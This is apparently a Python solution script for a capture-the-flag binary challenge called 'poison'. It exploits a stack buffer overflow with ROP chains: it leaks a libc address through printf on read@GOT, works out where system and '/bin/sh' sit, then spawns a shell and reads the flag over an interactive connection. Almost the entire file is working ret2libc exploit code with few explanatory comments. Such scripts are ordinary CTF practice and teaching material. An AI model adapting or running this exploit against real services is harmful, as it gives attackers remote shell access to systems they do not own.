#!/usr/bin/env python3
import socket
import telnetlib
import string
import struct

SERVER = True

def p64(x):
    return struct.pack("<Q", x)

def up64(x):
    return struct.unpack("<Q", x.ljust(8, b'\x00'))[0]
    # return int.from_bytes(x, "little")

# Connect to program
s = socket.socket()
if SERVER:
    s.connect(('challs.hats.sg', 1306))
else:
    # host locally:
    # socat TCP-LISTEN:1306,reuseaddr,fork EXEC:./poison
    # while true; do socat TCP-LISTEN:1306,reuseaddr,fork EXEC:"strace -f ./poison"; done
    s.connect(('127.0.0.1', 1306))
t = telnetlib.Telnet()
t.sock = s

# Define addresses
read_got = 0x603060
gets_got = 0x603070  # gets@GOT
printf_got = 0x603038  # printf@GOT
printf_plt = 0x401860  # j_printf

gadget_poprdi = 0x401ed3
main_addr = 0x401d2a

if SERVER:
    # Server offsets
    libc_offset_read   = 0x0f7250
    libc_offset_printf = 0x055800
    libc_offset_system = 0x045390
    libc_offset_binsh  = 0x18cd57
else:
    # Local offsets
    libc_offset_read   = 0x0e91c0 
    # libc_offset_gets   = 0x067040
    libc_offset_printf = 0x056ed0
    libc_offset_system = 0x0435d0
    libc_offset_binsh  = 0x17f573


# Form payload
padding = b"A" * 120 
# padding += p64(0xffffeeeeddddcccc)

# Menu for Choice 0
t.write(b'0\n')
print(t.read_until(b'case'))

# ROP: No idea why, but we must submit a dummy ROP before we can leak LIBC
buf = padding
buf += struct.pack("<Q", main_addr)
print(t.read_until(b'Say> '))
t.write(buf + b'\n')

# Menu for Choice 0
t.write(b'0\n')
print(t.read_until(b'case'))

# ROP: to leak LIBC
buf = padding
buf += p64(gadget_poprdi)
#buf += p64(gets_got) # printf_got & gets_got did not work on server
buf += p64(read_got) # printf_got did not work on server
buf += p64(printf_plt)
buf += p64(main_addr)
print(t.read_until(b'Say> '))
t.write(buf + b'\n')

# Retrieve leaked address
print(t.read_until(b'"\x1b[u')) # closing quatation sequence

addr_leaked_raw = t.read_until(b'___')  # banner underscores
addr_leaked = up64(addr_leaked_raw.replace(b'___', b''))
print(addr_leaked_raw)
print('LEAKED ADDR:', hex(addr_leaked))

# Calculate libbc
#gets_libc = addr_leaked
#libc_base = gets_libc - libc_offset_gets
#print('[!] Leaked gets@libc:', hex(gets_libc))

libc_base = addr_leaked - libc_offset_read

system_libc = libc_base + libc_offset_system
print('[!] Calculate system@libc:', hex(system_libc))

binsh_libc = libc_base + libc_offset_binsh
print('[!] Calculate binsh@libc:', hex(binsh_libc))

# Menu for Choice 0
t.write(b'0\n')
print(t.read_until(b'case'))

# ROP: Send payload
buf = padding
buf += struct.pack("<Q", gadget_poprdi)
buf += struct.pack("<Q", binsh_libc)
buf += struct.pack("<Q", system_libc)
# buf += struct.pack("<Q", printf_plt)
buf += struct.pack("<Q", main_addr)
print(t.read_until(b'Say> '))
t.write(buf + b'\n')

# cat flag
t.write(b'ls -la\n')
t.write(b'cat flag\n')
t.interact()
